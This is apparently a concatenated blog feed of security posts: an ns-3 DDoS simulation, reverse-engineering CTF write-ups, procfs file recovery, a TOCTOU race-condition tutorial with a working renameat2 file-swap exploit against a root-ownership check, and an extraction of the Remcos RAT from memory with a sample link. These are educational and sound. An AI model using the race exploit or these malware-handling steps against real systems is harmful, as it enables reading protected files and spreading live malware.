onOffApp[NUMBER_OF_BOTS];Then we can install in each bot node by ://Install application in all botsfor (int k = 0; k &lt; NUMBER_OF_BOTS; ++k){ onOffApp[k] = onoff.Install(botNodes.Get(k)); onOffApp[k].Start(Seconds(0.0)); onOffApp[k].Stop(Seconds(MAX_SIMULATION_TIME));}Client ApplicationNow the client also needs application stack to simulate communication from server. We will use BulkTCP connection for this purpose simulation some large file transfer for resource request.// Sender Application (Packets generated by this application are throttled)BulkSendHelper bulkSend(\"ns3::TcpSocketFactory\", InetSocketAddress(i12.GetAddress(1), TCP_SINK_PORT));bulkSend.SetAttribute(\"MaxBytes\", UintegerValue(MAX_BULK_BYTES));ApplicationContainer bulkSendApp = bulkSend.Install(nodes.Get(0));bulkSendApp.Start(Seconds(0.0));bulkSendApp.Stop(Seconds(MAX_SIMULATION_TIME - 10));Server Side TCP and UDP sinksNow let’s install application in our server to receive these packets// UDPSink on receiver sidePacketSinkHelper UDPsink(\"ns3::UdpSocketFactory\", Address(InetSocketAddress(Ipv4Address::GetAny(), UDP_SINK_PORT)));ApplicationContainer UDPSinkApp = UDPsink.Install(nodes.Get(2));UDPSinkApp.Start(Seconds(0.0));UDPSinkApp.Stop(Seconds(MAX_SIMULATION_TIME));// TCP Sink Application on server sidePacketSinkHelper TCPsink(\"ns3::TcpSocketFactory\", InetSocketAddress(Ipv4Address::GetAny(), TCP_SINK_PORT));ApplicationContainer TCPSinkApp = TCPsink.Install(nodes.Get(2));TCPSinkApp.Start(Seconds(0.0));TCPSinkApp.Stop(Seconds(MAX_SIMULATION_TIME));We can then populate the IP ROUTING TABLE by :Ipv4GlobalRoutingHelper::PopulateRoutingTables();This will bake all the network connections and applications in place for simulation.Setting up Animation in NetAnim ModuleOur main structure is complete and now we can prepare our simulation grounds.Configuring mobility in nodes://Simulation NetAnim configuration and node placementMobilityHelper mobility;mobility.SetPositionAllocator(\"ns3::GridPositionAllocator\", \"MinX\", DoubleValue(0.0), \"MinY\", DoubleValue(0.0), \"DeltaX\", DoubleValue(5.0), \"DeltaY\", DoubleValue(10.0), \"GridWidth\", UintegerValue(5), \"LayoutType\", StringValue(\"RowFirst\"));mobility.SetMobilityModel(\"ns3::ConstantPositionMobilityModel\");mobility.Install(nodes);mobility.Install(botNodes);Placing Nodes in Simulation Grid:AnimationInterface anim(\"DDoSim.xml\");ns3::AnimationInterface::SetConstantPosition(nodes.Get(0), 0, 0);ns3::AnimationInterface::SetConstantPosition(nodes.Get(1), 10, 10);ns3::AnimationInterface::SetConstantPosition(nodes.Get(2), 20, 10);uint32_t x_pos = 0;for (int l = 0; l &lt; NUMBER_OF_BOTS; ++l){ ns3::AnimationInterface::SetConstantPosition(botNodes.Get(l), x_pos++, 30);}We are almost done then we just need to run the simulation and view in NetAnim.Full Code/* * LICENSE : GNU General Public License v3.0 (https://github.com/Saket-Upadhyay/ns3-cybersecurity-simulations/blob/master/LICENSE) * REPOSITORY : https://github.com/Saket-Upadhyay/ns3-cybersecurity-simulations * ================================================================================= * * In this we follow the following setup / node placement * * (n1) * \\ * \\ * -------- (n2) -------- (n3) * / | \\ * / | \\ * / | \\ * (B0),(B2)...(Bn) * * N0 is legitimate user, communicating with server N2 (data server) via node N1 (maybe website server interface ) * B0-Bn are bots DDoS-ing the network. * * NetAnim XML is saved as -&gt; DDoSim.xml * */#include &lt;ns3/csma-helper.h&gt;#include \"ns3/mobility-module.h\"#include \"ns3/nstime.h\"#include \"ns3/core-module.h\"#include \"ns3/network-module.h\"#include \"ns3/internet-module.h\"#include \"ns3/point-to-point-module.h\"#include \"ns3/applications-module.h\"#include \"ns3/ipv4-global-routing-helper.h\"#include \"ns3/netanim-module.h\"#define TCP_SINK_PORT 9000#define UDP_SINK_PORT 9001//experimental parameters#define MAX_BULK_BYTES 100000#define DDOS_RATE \"20480kb/s\"#define MAX_SIMULATION_TIME 10.0//Number of Bots for DDoS#define NUMBER_OF_BOTS 10using namespace ns3;NS_LOG_COMPONENT_DEFINE(\"DDoSAttack\");int main(int argc, char *argv[]){ CommandLine cmd; cmd.Parse(argc, argv); Time::SetResolution(Time::NS); LogComponentEnable(\"UdpEchoClientApplication\", LOG_LEVEL_INFO); LogComponentEnable(\"UdpEchoServerApplication\", LOG_LEVEL_INFO); //Legitimate connection bots NodeContainer nodes; nodes.Create(3); //Nodes for attack bots NodeContainer botNodes; botNodes.Create(NUMBER_OF_BOTS); // Define the Point-To-Point Links and their Paramters PointToPointHelper pp1, pp2; pp1.SetDeviceAttribute(\"DataRate\", StringValue(\"100Mbps\")); pp1.SetChannelAttribute(\"Delay\", StringValue(\"1ms\")); pp2.SetDeviceAttribute(\"DataRate\", StringValue(\"100Mbps\")); pp2.SetChannelAttribute(\"Delay\", StringValue(\"1ms\")); // Install the Point-To-Point Connections between Nodes NetDeviceContainer d02, d12, botDeviceContainer[NUMBER_OF_BOTS]; d02 = pp1.Install(nodes.Get(0), nodes.Get(1)); d12 = pp1.Install(nodes.Get(1), nodes.Get(2)); for (int i = 0; i &lt; NUMBER_OF_BOTS; ++i) { botDeviceContainer[i] = pp2.Install(botNodes.Get(i), nodes.Get(1)); } //Assign IP to bots InternetStackHelper stack; stack.Install(nodes); stack.Install(botNodes); Ipv4AddressHelper ipv4_n; ipv4_n.SetBase(\"10.0.0.0\", \"255.255.255.252\"); Ipv4AddressHelper a02, a12, a23, a34; a02.SetBase(\"10.1.1.0\", \"255.255.255.0\"); a12.SetBase(\"10.1.2.0\", \"255.255.255.0\"); for (int j = 0; j &lt; NUMBER_OF_BOTS; ++j) { ipv4_n.Assign(botDeviceContainer[j]); ipv4_n.NewNetwork(); } //Assign IP to legitimate nodes Ipv4InterfaceContainer i02, i12; i02 = a02.Assign(d02); i12 = a12.Assign(d12); // DDoS Application Behaviour OnOffHelper onoff(\"ns3::UdpSocketFactory\", Address(InetSocketAddress(i12.GetAddress(1), UDP_SINK_PORT))); onoff.SetConstantRate(DataRate(DDOS_RATE)); onoff.SetAttribute(\"OnTime\", StringValue(\"ns3::ConstantRandomVariable[Constant=30]\")); onoff.SetAttribute(\"OffTime\", StringValue(\"ns3::ConstantRandomVariable[Constant=0]\")); ApplicationContainer onOffApp[NUMBER_OF_BOTS]; //Install application in all bots for (int k = 0; k &lt; NUMBER_OF_BOTS; ++k) { onOffApp[k] = onoff.Install(botNodes.Get(k)); onOffApp[k].Start(Seconds(0.0)); onOffApp[k].Stop(Seconds(MAX_SIMULATION_TIME)); } // Sender Application (Packets generated by this application are throttled) BulkSendHelper bulkSend(\"ns3::TcpSocketFactory\", InetSocketAddress(i12.GetAddress(1), TCP_SINK_PORT)); bulkSend.SetAttribute(\"MaxBytes\", UintegerValue(MAX_BULK_BYTES)); ApplicationContainer bulkSendApp = bulkSend.Install(nodes.Get(0)); bulkSendApp.Start(Seconds(0.0)); bulkSendApp.Stop(Seconds(MAX_SIMULATION_TIME - 10)); // UDPSink on receiver side PacketSinkHelper UDPsink(\"ns3::UdpSocketFactory\", Address(InetSocketAddress(Ipv4Address::GetAny(), UDP_SINK_PORT))); ApplicationContainer UDPSinkApp = UDPsink.Install(nodes.Get(2)); UDPSinkApp.Start(Seconds(0.0)); UDPSinkApp.Stop(Seconds(MAX_SIMULATION_TIME)); // TCP Sink Application on server side PacketSinkHelper TCPsink(\"ns3::TcpSocketFactory\", InetSocketAddress(Ipv4Address::GetAny(), TCP_SINK_PORT)); ApplicationContainer TCPSinkApp = TCPsink.Install(nodes.Get(2)); TCPSinkApp.Start(Seconds(0.0)); TCPSinkApp.Stop(Seconds(MAX_SIMULATION_TIME)); Ipv4GlobalRoutingHelper::PopulateRoutingTables(); //Simulation NetAnim configuration and node placement MobilityHelper mobility; mobility.SetPositionAllocator(\"ns3::GridPositionAllocator\", \"MinX\", DoubleValue(0.0), \"MinY\", DoubleValue(0.0), \"DeltaX\", DoubleValue(5.0), \"DeltaY\", DoubleValue(10.0), \"GridWidth\", UintegerValue(5), \"LayoutType\", StringValue(\"RowFirst\")); mobility.SetMobilityModel(\"ns3::ConstantPositionMobilityModel\"); mobility.Install(nodes); mobility.Install(botNodes); AnimationInterface anim(\"DDoSim.xml\"); ns3::AnimationInterface::SetConstantPosition(nodes.Get(0), 0, 0); ns3::AnimationInterface::SetConstantPosition(nodes.Get(1), 10, 10); ns3::AnimationInterface::SetConstantPosition(nodes.Get(2), 20, 10); uint32_t x_pos = 0; for (int l = 0; l &lt; NUMBER_OF_BOTS; ++l) { ns3::AnimationInterface::SetConstantPosition(botNodes.Get(l), x_pos++, 30); } //Run the Simulation Simulator::Run(); Simulator::Destroy(); return 0;}Simulation ResultLet’s build the project and check our simulations../waf --run DDoSim(“Building Simulation with waf”)After that we should have DDoSim.xml which we can load in NetAnim for Simulation.With 1 BotHere we can see that there is not much interference in network speed. and Alice is able to complete the file transfer.With 10 BotsHere we can see significant effect on network speed and the after 2nd packet client is struggling in receiving requested resources.ConclusionWe can experiment with the above program and increase or decrease number of bots, bandwidth etc and observe the effect on the network.I hope this will help you to visualize DDoS and get some technical insight.The code is under GNU General Public License v3.0, so it can be used anywhere with proper citation.That’s all for this article, will see you in next one.Till then stay Caffeinated !Resources NS-3 Docs : Official Website NSNAM Tutorials Official Documentation –" }, { "title": "Shifter2 [CipherCombat2.0 CTF write-up]", "url": "/blog/posts/CipherCombat2-Shifter2/", "categories": "CTF, Rev", "tags": "ctf writeup", "date": "2020-04-13 00:00:00 +0530", "snippet": "Reverse Engineering Challenge of Hacker Earth CipherCombat2.0What we get?A zip file with password “hakerearth”… In there we find a PNG imageChecking the file for strings and embedded files we find nothing, and this is reverse engineering challenge so we will not go for stenography mumbo jumbo.Let’s Solve thisLooking at the image, we can see it’s Graph representation of assembly code, and here is the image we get :-Now let’s try to understand what this is trying to do.1st BlockThe first block is our MAIN() function taking some argumentsint main(int argc,char **argv,char **envp);argc = no of argumentsargv = argument pointerenvp = enviornment pointerIt initializes bunch of variables and then stack setting routine.we also see that it compares argc with 1 followed by JE conditionchecking number of arguments should be equal to 2, argv[0] is always program name and argv[1] is our supplied password. That means we have to give exactly ONE parameter to the program.If the condition is not satisfied it’s putting 1 in EAX (that’s our return register) and then returning from the main() routine, that’s equivalent to exit(1);, but here implemented through return 1;2nd BlockMost of this block is just initialization of some variables and then a jump statement to get to next block.also interesting thing to notice is that address spaces are separated by 4bytes each, looks similar? Yes, it’s character array allocation of 15 characters.then it sets var_4h = 1Let’s start building the program to side by side…3rd BlockNow this looks likeInitialize a var &gt; do something &gt; add 1 to it&gt; check if var =&gt;0xf i.e (15)base &gt; repeatLooks familiar? loops something with increasing variable?It’s nothing but a for()/while() loop implementation which iterates for 15 times, same as our character array length.so let’s define it asfor(int i=1;i≤15;i++){ loop body }also, at the end of loop body it compares something and if it fails it shows “Better Luck next time” and then exit.Other wise it completes the loop and exit with “c0ngrats!” message.The Loop BodyThe loop body is pretty interesting, it might look intimidating to new reverse engineer but it’s really simple.With some experience, you can already tell what it’s doing.Let’s have a look at it.now as we know it’s a loop and var_4h is our control variable let’s call it “i”. First we load the value of i in EAX, then we load the address of rax*8 to RDX, and then move our ARGUMENT(var_60h) into RAX. Then we do logical and RAX,RDX and mov Quad Word value at address of RAX to RAX, now we Move with Zero extended (movzx) byte value of RAX to …… ahhhhh… i am pretty sure this does not make it easier for you to understand it, all i am doing is dictating the instructions one by one… Know this : Look at it, remember the pattern and know that it is one of the methods compilers implement fetching an element at some given index.You can ofcourse take some values yourself and try this but the full explaination is out of scope for this writeup, also it will make it boring and long enough.Some important instruction reference (links):Convert Doubleword to Quadword (CDQE)Move with Zero-Extend (MOVZX)Move with Sign-Extension (MOVSX)Okay so what it actually did? Lemme explain: Take value at [i-1] index from our argument =argv[i-1] let’s say = arg Take value at [i-1] index from our character array = charp[i-1] Add i to our charp = charp[i-1]+i Add 1 to Step3 = charp[i-1]+i+1 , let’s say = charpnew Compare arg == charpnew.These instructions are responsible for step 3 and 4, remember we stored our i in EAX ? and then we add EAX (i.e. i )to ECX, our element which is stored in EAX and then again add 1 to new EAX.and now converting it to code we have :Now instead of checking the flag we can print it !!Here’s is relatively clean Python Implementation of above algorithm, Running it spits out the flag.#!/bin/python3given_array=[0x71, 0x65, 0x65, 0x61, 0x6e, 0x2c, 0x6a, 0x56, 0x68, 0x5a, 0x68, 0x68, 0x64, 0x5f, 0x63]for i in range(1,len(given_array)+1): print(chr(given_array[i-1]+i+1),end='')print(\"\\n\")And we got the flag HE{shift3r_returns} we can also check it with the C++ program we reconstructed.That’s it for this challenge, actually an easy one, just some basic experience in reverse engineering needed." }, { "title": "Locked [CipherCombat2.0 CTF write-up]", "url": "/blog/posts/CipherCombat2-Locked/", "categories": "CTF, Rev", "tags": "ctf writeup", "date": "2020-04-13 00:00:00 +0530", "snippet": "Reverse Engineering Challenge of Hacker Earth CipherCombat2.0What we get ?We get a zip file with our binary in it with password hackerearth.After unzipping the file, we can start looking at the binary.Important stuff : it’s Linux Executable and not stripped… This makes task easier.Solving the challengeLet’s make the file executable by chmod.now let’s run it once and see what it actually does…So seems like some type password check, and the name of challenge checks out !Let’s Disassemble it and try to understand the checking mechanism.doing Strings on the file we get something interesting…Looks like good password? Also if we see the disassembly we see main calls the fun2() function before test eax,eax at 0x000012d7 which controls the flow of program… and see what it compares! the same string !Let’s just try this as password…And that works ! submit the flag and get them points…About CTFHacker Earth’s CipherCombat2.0 was great CTF for beginners in the security field. Overall nice refresher." }, { "title": "Recover Files in Linux from Live Processes", "url": "/blog/posts/Recover-Deleted-Files-in-Linux/", "categories": "Linux", "tags": "linux, recovery", "date": "2020-02-02 12:12:12 +0530", "snippet": "Recover recently deleted file (if it’s still open in some process) using properties of procfsEver deleted an important file while it’s still open in some other process?or Someone opened a PDF file in your PC from pen drive and removed the pen drive while it’s still open in some PDF-Viewer and you wanted to save it first and now you are just not touching that process because that’s the last trace of that file left in your computer?Well, luckily you have procfs to your rescue. Let’s check the definition : /proc is very special in that it is also a virtual filesystem. It’s sometimes referred to as a process information pseudo-file system. It doesn’t contain ‘real’ files but runtime system information (e.g. system memory, devices mounted, hardware configuration, etc). For this reason it can be regarded as a control and information centre for the kernel. In fact, quite a lot of system utilities are simply calls to files in this directory. For example, ‘lsmod’ is the same as ‘cat /proc/modules’ while ‘lspci’ is a synonym for ‘cat /proc/pci’. By altering files located in this directory you can even read/change kernel parameters (sysctl) while the system is running.source : www.tldp.orgSetup.For this demonstration we just need one pdf file and… well that’s it![I am using Ubuntu 18.04 LTS for this demo.]How to.Let’s follow this step-by-step.STEP 0:Open the PDF file with default PDF viewer.STEP 1:DELETE THE FILE. FROM THE FOLDER. P E R M A N E N T L Y.STEP 2:Now as we have deleted the file, let’s get on work to recover that.Let’s fetch our PDF viewer’s PID (Process ID) using “ps”What’s pid you might ask? here… the process identifier (a.k.a. process ID or PID) is a number used by most operating system kernels — such as those of Unix, macOS and Windows — to uniquely identify an active process.source : WikiPediaso now we have our PID = 5201.STEP 3:Let’s go to /proc/&lt;pid&gt;,yes that’s how your Linux PC keeps track of processes.In our case it’s /proc/5201/STEP 4:We will now try to locate the file descriptor for our target file in the process, file descriptor? here you go… A file descriptor is a number that uniquely identifies an open file in a computer’s operating system. It describes a data resource, and how that resource may be accessed.Now, go to “fd” (file descriptor) folder.We can see that file descriptor 14 points to our ex-impotant-ish file DocumentPDF.pdf and smartly shows “(deleted)” status after it.But our program still has access to the PDF file and it’s open there, so how? ‘cause file descriptor points to the file’s actual real-time location from which the program is using it,so if not on disk then in memory.STEP 5:Just “cat” the file pointer to some other location, and that’s it!Here we write the file bit-wise to “restore.pdf” using ‘cat’.AND BAM !!! We have our file back.ConclusionThis is one of the things I found interesting enough while reading about Linux file system and mysteries of it’s file and process management techniques, which was worth sharing.From Here …PROCFSAll You Need To Know About Processes in LinuxWhat is a File Descriptor?" }, { "title": "Winning Race Conditions", "url": "/blog/posts/Winning-Race-Conditions/", "categories": "Security", "tags": "race condition", "date": "2019-12-21 12:12:12 +0530", "snippet": "Introduction to Race Condition Vulnerability and how to Exploit them.One fine day, someone, somewhere was absorbing random knowledge from the “great internet forums” and stumbled on a CTF challenge remake.The challenge was to read the flag from a file [duh… “capture the FLAG(CTF)”]… but here the file was owned by root user and the programs checks for the same and if it is so, then it will not read it for us.This actually took me hours of screaming and existential crisis, and then after looking at naked code for long enough with extensive internet researches, I found the solution (or the solution found me?). Anyways, this was cool enough for me to share with you, so here we go with an article.So what it’s all about?TL;DR : If the computer program tries to check for some condition more than once, we try to change the state of the condition in between two? transfers in attempt to deceive the program into behaving in the way wewant or it’s not supposed to work.if you want to skip, jump to EXPLOIT sectionIn technical terms, “A race condition or race hazard is the condition of an electronics, software, or other system where the system’s substantive behavior is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when one or more of the possible behaviors is undesirable.” — WikiPediaIn the light of computer security,“In software development, time-of-check to time-of-use (TOCTOU, TOCTTOU or TOC/TOU) is a class of software bugs caused by a race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check.”— says… guess who? …. WikiPedia, ofc.Let’s try to understand this while attempting to do the challenge we got.Recreating the challenge.Let’s first recreate the challenge in our own machine, so that we can try it while reading this article… cool? let’s go… We will be using Linux for all the things, ’cause Linux is Love. If you are already working on Linux just go on, you are doing great in life, if otherwise, you can use virtual machine for this tutorial and we are good.Step 1:Let’s create a file with root ownership which will create our flag. We can do this by following commands :echo \"{th1s_fl@g_i5_wh@7_w3_s33k}\" &gt; flag.txtchown root:root flag.txtStep 2:Here’s the C code of challenge binary, used to read the root flag.txt#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;int main(int argc, char* argv[]){int fd;int size = 0;char buf[256];if(argc != 2){printf(\"usage: %s &lt;file&gt;\\n\", argv[0]);exit(1);}struct stat stat_data;if(stat(argv[1],&amp;stat_data)&lt;0){fprintf(stderr, \"Failed to stat %s: %s\\n\", argv[1], strerror(errno));exit(1);}if(stat_data.st_uid == 0){fprintf(stderr, \"File %s is owned by root\\n\", argv[1]);exit(1);}fd = open(argv[1], O_RDONLY);if(fd &lt;= 0){fprintf(stderr, \"Couldn’t open %s\\n\", argv[1]);exit(1);}do {size = read(fd, buf, 256);write(1, buf, size);}while(size&gt;0);}I know ! I know ! This is some aggressively jotted down code chunk and yes, but it works and it’s just packed by removing all unnecessary spaces and indentation.For now just copy it can paste in a *.c file and this will work.after compiling we get the following behaviour from our program…But we want it to somehow show the contents of the file, and that’s what we will try to do, but first let’s see what the program is actually doing and what we understand from it.Dissection of C CodeHere’s beautified code for you,#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;int main(int argc, char* argv[]) { int fd; int size = 0; char buf[256]; if(argc != 2) { printf(\"usage: %s &lt;file&gt;\\n\", argv[0]); exit(1); } struct stat stat_data; if (stat(argv[1], &amp;stat_data) &lt; 0) { fprintf(stderr, \"Failed to stat %s: %s\\n\", argv[1], strerror(errno)); exit(1); } if(stat_data.st_uid == 0) { fprintf(stderr, \"File %s is owned by root\\n\", argv[1]); exit(1); } fd = open(argv[1], O_RDONLY); if(fd &lt;= 0) { fprintf(stderr, \"Couldn't open %s\\n\", argv[1]); exit(1); } do { size = read(fd, buf, 256); write(1, buf, size); } while(size&gt;0);}View Raw on GitHubNow, let’s try to understand its workings,Line 1 to 6 are just imports.(all hail header files)Line 9,10,11 declares some obvious variables.Now we can see that we have 4 conditions before line 38 which will actually display the contents of the file. Let’s try to understand these.At line 13, we have condition to check if the given arguments to the program equals “two” or not. actually that means we have to provide one file in the arguments, the other argument is just the program itself given by default. So according to this if we don’t provide a file to read this will executeprintf(\"usage: %s &lt;file&gt;\\n\", argv[0]);and then exit.At line 19, we check if the file contains valid formatted data or not, we can see in line 18 we defined object for stat structure from sys/stat.h header. In line 19 “if” condition we just check if we are able to extract information from the supplied file or not. If not, then we executefprintf(stderr, \"Failed to stat %s: %s\\n\", argv[1], strerror(errno));which will print error message in standard error out and then exit.pubs.opengroup.org/onlinepubs/007908799/xsh/sysstat.h.htmlAt line 24, we check if the file is owned by root or not by checking the uid of the file. What’s UID ? check the link below…UID AND GID IN LINUXThe last check is at Line 32, just checks if we are able to successfully open the file as read only or not. Notice that file open at Line 30? it’s there to check for that only, no big deal here.Overall working :The program takes one argument as the file we want to open and then it will check if it’s a valid file or not and then checks for root ownership, and then if not owned by root it will try to open it as read only and then if successful in that it will show the contents.What we need to do?According to above information if we somehow convince the program that the file is not root we might be able to see the contents of the file, because this is the only barrier that out file has, it’s owned by root all other checks are just kind-of integrity checks.Finding the race condition flawNow let’s see where’s the bug that we were talking about actually is…Here we need to focus… let’s examine the flow of the program again, and we can see that it uses argument argv[1] two times in the file at significant interval.once at Line 19 :if (stat(argv[1], &amp;stat_data) &lt; 0) {And then in Line 30 :fd = open(argv[1], O_RDONLY);Interestingly, it check for the root ownership with the first use and then actually opens the file to display the contents from second usage.Now imagine if we are able to change the file in between two uses of the argument we might be able to tell the program that the file is not owned by root and then pass on the file owned by root to open !!Let’s try to understand this with a diagram.The ExploitTo exploit this vulnerability, we need to quickly swap the files before the other function calls it.After watching lots and lots of tutorials on system calls, Linux file management etc. in hopes to find any solution to this, eventually bumped into one.Okay, so we are going to use following things in our exploit SYS_renameat2 [Systemcall] : MAN7.ORG/LINUX/MAN-PAGESOur idea is to swap / rename the two files so fast that we are able to pull off above described maneuver.Here is a small C code that can help us do that :#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;linux/fs.h&gt;// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.cint main(int argc, char *argv[]) { while (1) { syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE); } return 0;}Copy the C code and compile it normally with gcc, that being done, let’s understand the code :Line 1 to 7 are just importsLine 11 has infinite While loop as while(1) is always trueLine 12 here has a super important “syscall()” will call the system call from C program, here it calls renameat2 system call.We pass the two arguments as filenames we want to rapidly swap as argv[1] and argv[2]. Let’s understand other parameters: AT_FDCWD :If pathname is relative and dirfd is the special value AT_FDCWD, then pathname is interpreted relative to the current working directory of the calling process. RENAME_EXCHANGE — does an atomic exchange. Atomic exchange? yeah that’s new to me too … here it is Atomic Operation in Linx Kernel - EmbHackHOW TO USE THE EXPLOIT ?Now as we have the exploit and we know how it works, let’s use it.just create a temp. file with anything in itecho \"1\" &gt;./tempNow run the exploit program with the flag and temp file as its parametersthis will not produce any output but let it run, it is swapping the two files rapidly.Now OPEN NEW TERMINAL and run readFlag program with flag as parameter.AND THERE WE HAVE IT !! our F L A G…Sign-offPhew! that was lots of information for one article, I understand … may be it’s not that simple as I intended to make it but believe me when i say this… I was just amazed and overwhelmed with the knowledge I gained on my way through it and wanted to share it asap.Well I hope this was new to you too and you enjoyed it, if you have any suggestion or feedback, feel free to drop it in comments.See ya all in next article, till then keep your bodies caffeinated enough! NOTE: here is an awesome video by LiveOverflow on the same topic and actually this is the one which inspired me to write about it. YOUTUBE LINK" }, { "title": "Digest [CipherCombat2.0 CTF write-up]", "url": "/blog/posts/CipherCombat2-Digest/", "categories": "CTF, Rev", "tags": "ctf writeup", "date": "2019-12-04 12:12:12 +0530", "snippet": "Reverse Engineering Challenge of Hacker Earth CipherCombat2.0What we get?A zip file with password “hackerearth”… unzip it and we get a Linux ExecutableNotice I highlighted LSB(Least Significant Bit) ? We will see why later…Solving the challengeLet’s do strings …With strings we found some Texts but nothing like our flag.Important thing to see here is MD5 function calls and use of libcrypto.so.1.1 points at use of MD5 hash algorithm.Further we can check this by listing all imports by RABIN2And we see that MD5 global functions are important.Let’s check the disassembly now…We can see that it compares the MD5 digest of string supplied with a hard coded MD5 value. We can also see it has moved hard-coded hex string to stack at 0x000011adAny ways, it is comparing with something in stack, and my favorite way is to fire up GDB and check the stack in real-time to get the data.Let’s have a look at GDB disassembly…We can see that string compare function is at *main+186 so we will put break point there.Now let’s run the program and provide random input.We hit our breakpoints ! Let’s check registers, STRNCMP compares values stored in [R/ESI] with [R/EDI]…So get address of our hard-coded hash loaded in stack, lets check it out how it’s doing.And we get our values now let’s reconstruct the MD5Remember about LSB? these values are stored like that, we need to convert it into MSB and then we can continue.Copy the values in any text editor and rearrange them as following…so at last we have our hash : 53a167c8d4dc964f7d7838dd4ce2d137Only thing left to do is brute force it, we can use online services, the one I used and which they later provided in their free hint is https://hashes.org/And we have our flag :HE{iamalmighty9}&lt; And here is a cross check with the challenge binary.Another Fun challenge! Done. NOTE: we could have done it in 3–4 less steps by just converting the strings found in MOVABS instructions,But what’s the fun in that, also i wanted to show you the dynamic analysis path. :-)" }, { "title": "Extracting injected malware from memory", "url": "/blog/posts/Extracting-packer-injected-malware/", "categories": "Malware", "tags": "malware analysis, remcos", "date": "2019-12-04 12:12:12 +0530", "snippet": "Extraction of injected malicious PE from dynamic memory in windows (Remcos malware)Usually, malware comes packed by some packer which obfuscates the original code and helps it to evade AV software or general human suspicion. When executed the packed binary inject actual binary in the memory and runs it from there.What we will cover in this write-up? Approach for setting break-point in packed binary to stop it in midst of injecting the malicious code and executing it. Bypassing malware’s “debugger bypass tricks” Locate and dump injected code from the memory. Do necessary patching.Setup Environment : Operating_System : Windows 10, Enterprise Evaluation 180914 Software_Arsenal : x32debugger, PE bear, Hexadecimal Editor HxD Malware_Binary : RemcosWhat is Remcos RAT?Here you go, blog.malwarebytes.comWant to follow up with the article?Here’s your malware, handle with care and caution.Malshare RemCos Download LinkLab setup and Initial InspectionWe will be using our Windows 10 Virtual Machine. We have set networking to “HOST ONLY” to transfer the binary to VM via Python’s SimpleHTTPServer.Now we have our binary, before starting we will shut down network and folder sharing in VM to prevent chaos if things goes sideways.Let’s rename our binary to RemCOS.bin and start investigation with PE Bear.The binary seems to be a VB6 packer. Lets fire up x32debugger and load our binary in it.Setting Break-point at CreateProcessInternalW What’s CreateProcessInternalWThis API call allows the program to spawn a new process from itself, usually packers use this method to inject actual malware code in memory and execute them using CreateProcessInternalW.Without more delay let’s create a breakpoint here. Type:bp CreateProcessInternalWIn cmd. section and press enter.Bypassing Debugger DetectionAs we continue to execute the binary, we stumble upon one interesting Exception. This can be an anti-debugger tactics or just some random exception from one of VB6 APIs. Anyways this is blocking us from hitting our intended break-point.To bypass this, do Debug &gt; Advanced &gt; Run (pass exceptions)This will pass all the exceptions to program as it would do in normal execution. Now we can hit out break-point :Finding and Dumping Injected CodeWe now know that it’s trying to run something from memory, we need to find what is it.For that goto Memory Map. As we know that most of Portable Executable File (PE File) has a DOS header which says something like “This program cannot be run in DOS mode” or something like that. We can try to search for this string in our memory map, and let’s see what we get.After the search we found following hits:Now we need to find our injected code, but here’s a hurdle : any file that contains our string “This program..” will be listed, including most of the microsoft’s own DLLs and support libraries.Finding the injected executable codeNow we have to trace each of the hits to check if it’s the code we are looking for or something else.Select one of all listed entries : Follow in Dump &gt; Follow in Memory MapYou will know when you will find something unusual like : Unnamed section in memory with Read Write and Executable permission.Select and “Dump Memory to File”We named it “remcos_extracted.bin” , let’s test it with PE Bear to make sure it was injected executable :Hmmmm… now what? but we found our DOS header and all right?Let’s inspect the file in Hex EditorAnd we have our DOS header… then? WHY PE BEAR IS NOT WORKING?This is because the file signature or magic number is not present !! Remember PE files start with “MZ.” header?Fixing Extracted Binary [Header Signature Fix]Now we know what’s missing, let’s repair the binary by placing missing header in place. But where to put it?Let’s go to check list method : MZ header usually aligns with starting offset. about ~60 bytes before DOS header PE FORMAT So let’s clean all the Zero padding before 0x000600 as this seems to be good place for our signature and fits our checklist.Clean all the padding above and modify first 2 Bytes as 4D 5A hexadecimal for MZ.Save the file and … Now let’s check this in PE BEARCool ! everything is fine.AND we have our memory injected malware out in open!Now we can fire up IDA or whatever rocks your boat to further analyze the extracted malware.But we will leave that for another article, (’cause ofcourse you can see how excited IDA is with this RAT) it will take much more space and time to clear out all those crazy Call Graphs.ConclusionI hope this will come in handy for someone. This was actually super cool to me.I was playing with windows memory recently and will share more as it comes. Till then… stay caffeinated enough and keep roaming in the memory lanes(pun intended)of windows.ReferencesOA LABS ANALYSIS VIDEOFinding injected code into memory - Count Upon Security" }, { "title": "Effortless Feature Extraction", "url": "/blog/posts/Effortless-Feature-Extraction/", "categories": "Misc.", "tags": "ML, feature extraction, android", "date": "2019-12-04 12:12:12 +0530", "snippet": "Streamline Permission-Based Feature Extraction for android data-set with one Python Script.Malware detection and analysis has been the hot topic in security for a long time, overtime the malware writers upgraded their skills and complexity and this has been the main reason for us to find new effective methodologies for malware detection and classification.As with the boom of AI and ML to solve general problems,the malware analysis and detection is not left untouched. Many researches has been published in the domain of malware detection using Machine Learning approach. But before doing all the gizmo of model training and neural network formation or any of those wires in brain magic, we need to collect certain information from the target to train our machine, and that is what we call features and that is what this article is all about, to get you started in the field.BaselineThe following article only focus on feature generation and formatting, specifically permission-based feature generation for android application.Here we will only see how we can speed up this process by using simple script which Does It All will break it down in some other article where we will discuss feature extraction in general followed my training our own ML model to detect Android malware !The ScriptLets get to the fun part, and explore the script itself. Get the Project in GitHubThis script will extract permission information from Malware and Benign applications in their respective folders and then create one Comma Separated Values (.csv) file to store them in one place ready to be fed into ML algorithms.HOW TO USE THE SCRIPT?Just copy your Malware and Benign applications on which you want to train your ML Model into respective folders and run the script by following command in terminal.python3 ExtractorAIO.pyAnd that’s it. yes. done. rest, the script will handleHOW TO USE THE GENERATED DATA-SET?The generated data will be in *.csv format and can be parsed with the help of many already available libraries or 